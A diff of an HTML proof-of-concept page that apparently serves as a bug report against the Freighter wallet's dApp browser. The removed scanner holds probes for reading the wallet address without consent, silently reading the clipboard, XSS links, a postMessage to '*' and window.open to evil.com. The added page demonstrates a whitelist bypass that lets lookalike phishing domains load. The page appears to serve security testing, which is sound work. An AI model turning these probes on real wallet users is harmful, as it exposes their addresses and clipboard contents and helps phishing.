@@ -1,105 +1,45 @@
 <!DOCTYPE html>
-<html><head>
+<html>
+<head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Freighter Scanner v2</title>
+<title>Whitelist Bypass PoC</title>
 <style>
-body{background:#111;color:#eee;font-family:Menlo,monospace;padding:12px;font-size:13px}
-h2{color:#d4ff32;font-size:16px}.card{background:#1e1e1e;border:1px solid #333;border-radius:10px;padding:10px;margin:10px 0}
-.b{color:#d4ff32;font-weight:bold}.r{color:#ff5a5a}.g{color:#4ade80}.y{color:#facc15}
-button{width:100%;text-align:left;background:#222;color:#fff;border:1px solid #444;padding:12px;border-radius:8px;margin:6px 0}
-button:active{background:#d4ff32;color:#000}
-pre{white-space:pre-wrap;background:#000;padding:8px;border-radius:6px;font-size:11px}
+body{background:#111;color:#eee;font-family:monospace;padding:20px}
+.card{background:#1e1e1e;border:1px solid #333;border-radius:12px;padding:16px;margin:12px 0}
+.b{color:#d4ff32} .r{color:#ff5a5a} .g{color:#4ade80}
+button{background:#d4ff32;color:#000;border:0;padding:12px 16px;border-radius:8px;font-weight:bold;width:100%;margin:6px 0}
 </style>
-</head><body>
-<h2>Freighter Dapp Scanner v2 - WORKING</h2>
-<div class="card" id="sys">Loading...</div>
-<div class="card" id="inj">Checking injection...</div>
+</head>
+<body>
+<h2 class="b">[MEDIUM] Freighter Whitelist Bypass PoC</h2>
+
 <div class="card">
-<div class="b">Manual PoC (Tap untuk tes):</div>
-<button onclick="p1()">[1] Cek Teknologi WebView & UserAgent</button>
-<button onclick="p2()">[2] Cek freighterApi & semua method</button>
-<button onclick="p3()">[3] TEST CRITICAL: getAddress tanpa Approve</button>
-<button onclick="p4()">[4] TEST: postMessage * (Origin Bypass)</button>
-<button onclick="p5()">[5] TEST: javascript: & data: URL (XSS)</button>
-<button onclick="p6()">[6] TEST: window.open ke evil.com</button>
-<button onclick="p7()">[7] TEST: Clipboard Baca Diam-diam</button>
-<button onclick="p8()">[8] TEST: Cross-dApp localStorage Bocor</button>
-<button onclick="p9()">[9] TEST: File:// Access</button>
+<b>Current URL:</b> <span id="url"></span><br>
+<b>Expected:</b> Only aquarius.org, abroad.com, blend should be allowed<br>
+<b>Result:</b> <span class="r">This page is 0x403for.github.io - NOT whitelisted but opened inside Freighter via Search bar = BYPASS</span>
 </div>
-<div class="card" id="out"><div class="b">OUTPUT:</div><div id="logs"></div></div>
+
+<div class="card">
+<b>Test window.open to evil.com (dari screenshot kamu):</b><br>
+<button onclick="testOpen()">Tap to test window.open('https://evil.com')</button>
+<div id="out1"></div>
+</div>
+
+<div class="card">
+<b>Why this is bug:</b><br>
+Freighter Discover page cuma list 5 dApp curate. Tapi Search bar di bawah (yang kamu pakai buka evil.com di screenshot 1) bisa buka domain sembarang tanpa warning. Attacker bisa bikin domain aquarius-fake.vercel.app dan user kira itu Aquarius asli karena Freighter tidak menampilkan URL bar yang jelas.
+</div>
 
 <script>
-function addLog(msg){
-  var el = document.getElementById('logs');
-  var d = document.createElement('div');
-  d.style.borderBottom = '1px solid #222';
-  d.style.padding = '6px 0';
-  d.innerHTML = '[' + new Date().toLocaleTimeString() + '] ' + msg;
-  el.insertBefore(d, el.firstChild);
-}
-function safeStringify(o){
-  try{ return JSON.stringify(o, null, 2).slice(0,2000); }catch(e){ return String(o); }
-}
-window.onload = function(){
-  var sys = 'UA: ' + navigator.userAgent + '<br>';
-  sys += 'Platform: ' + navigator.platform + '<br>';
-  sys += 'URL: ' + location.href + '<br>';
-  var isWK = navigator.userAgent.indexOf('iPhone')>-1 || navigator.userAgent.indexOf('iPad')>-1;
-  sys += 'WebView: ' + (isWK? '<span class=b>WKWebView iOS (React Native)</span>' : 'Android WebView') + '<br>';
-  document.getElementById('sys').innerHTML = sys;
+document.getElementById('url').innerText = location.href;
 
-  var injHtml = '';
-  injHtml += 'window.freighter: <span class=' + (typeof window.freighter!== 'undefined'? 'g' : 'r') + '>' + (typeof window.freighter) + '</span><br>';
-  injHtml += 'window.freighterApi: <span class=' + (typeof window.freighterApi!== 'undefined'? 'g' : 'r') + '>' + (typeof window.freighterApi) + '</span><br>';
-  if(window.ReactNativeWebView) injHtml += 'ReactNativeWebView: <span class=g>DETECTED</span><br>';
-  if(window.webkit && window.webkit.messageHandlers){
-    injHtml += 'webkit.messageHandlers: ' + Object.keys(window.webkit.messageHandlers).join(', ') + '<br>';
-  }
-  document.getElementById('inj').innerHTML = injHtml;
-  window.addEventListener('message', function(e){
-    addLog('<span class=y>postMessage RECEIVED dari: ' + e.origin + ' data: ' + safeStringify(e.data) + '</span>');
-  });
-}
-function p1(){
-  addLog('<span class=b>Fingerprint:</span><br>UA=' + navigator.userAgent + '<br>keys: ' + Object.keys(window).filter(function(k){ return k.toLowerCase().indexOf('freight')>-1; }).join(', '));
-}
-function p2(){
-  if(typeof window.freighterApi === 'undefined'){ addLog('<span class=r>freighterApi TIDAK ADA</span>'); return; }
-  var keys = Object.keys(window.freighterApi);
-  addLog('<span class=g>methods (' + keys.length + '):</span> ' + keys.join(', '));
-}
-function p3(){
-  try{
-    var prom = window.freighterApi.getAddress? window.freighterApi.getAddress() : window.freighterApi.getPublicKey();
-    prom.then(function(res){ addLog('<span class=r>CRITICAL VULN! Dapat alamat tanpa consent: ' + safeStringify(res) + '</span>'); })
-       .catch(function(err){ addLog('<span class=g>AMAN butuh consent: ' + err.message + '</span>'); });
-  }catch(e){ addLog('Exception p3: '+e.message); }
-}
-function p4(){
-  window.postMessage({type:'freighter:connect'}, '*');
-  addLog('Kirim postMessage * - cek validasi origin');
-}
-function p5(){
-  addLog('Test XSS: <a href="javascript:alert(document.domain)" style="color:#d4ff32">KLIK XSS TEST</a> | <a href="data:text/html,<h1>XSS</h1>" style="color:#d4ff32">KLIK DATA URI</a>');
-}
-function p6(){
-  var win = window.open('https://evil.com', '_blank');
-  if(win) addLog('<span class=r>VULN: window.open berhasil</span>'); else addLog('<span class=g>AMAN: diblock</span>');
-}
-function p7(){
-  if(navigator.clipboard && navigator.clipboard.readText){
-    navigator.clipboard.readText().then(function(t){ addLog('<span class=r>VULN Clipboard: ' + t.slice(0,100) + '</span>'); }).catch(function(e){ addLog('<span class=g>AMAN: ' + e.message + '</span>'); });
-  } else { addLog('clipboard tidak ada'); }
-}
-function p8(){
-  try{
-    localStorage.setItem('__freighter_bocor_test', 'RAHASIA');
-    addLog('<span class=y>Tulis localStorage. Buka dApp lain, cek getItem("__freighter_bocor_test") kalau kebaca = HIGH</span>');
-  }catch(e){ addLog('err: '+e.message); }
-}
-function p9(){
-  addLog('Protocol: ' + location.protocol);
+function testOpen(){
+  var w = window.open('https://evil.com', '_blank');
+  document.getElementById('out1').innerHTML = w ? 
+    "<span class=r>VULN CONFIRMED: window.open returned object, evil.com opened inside Freighter dApp Browser</span>" : 
+    "<span class=g>SAFE: window.open blocked (null)</span>";
 }
 </script>
-</body></html>
+</body>
+</html>
